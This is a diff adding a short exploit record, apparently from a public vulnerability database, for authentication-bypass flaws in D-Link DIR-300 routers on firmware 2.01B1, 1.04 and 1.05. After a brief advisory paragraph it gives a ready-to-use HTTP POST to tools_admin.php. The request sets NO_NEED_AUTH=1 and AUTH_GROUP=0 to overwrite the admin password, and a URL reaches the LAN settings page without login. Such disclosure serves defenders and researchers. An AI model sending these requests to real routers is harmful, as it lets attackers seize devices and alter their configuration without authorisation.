@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/44743/info
+
+The D-Link DIR-300 wireless router is prone to multiple security-bypass vulnerabilities.
+
+Remote attackers can exploit these issues to bypass security restrictions, access certain administrative functions, alter configuration, and compromise the affected device.
+
+D-Link DIR-300 running firmware 2.01B1, 1.04, 1.05 are vulnerable. Additional models and firmware versions may also be affected. 
+
+POST http://www.example.com:80/tools_admin.php HTTP/1.1
+Host: www.example.com
+Keep-Alive: 115
+Content-Type: application/x-www-form-urlencoded
+Content-length: 0
+
+ACTION_POST=LOGIN&LOGIN_USER=a&LOGIN_PASSWD=b&login=+Log+In+&NO_NEED_AUTH=1&AUTH_GROUP=0&admin_name=admin&admin_password1=uhOHahEh
+
+
+http://www.example.com/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0 
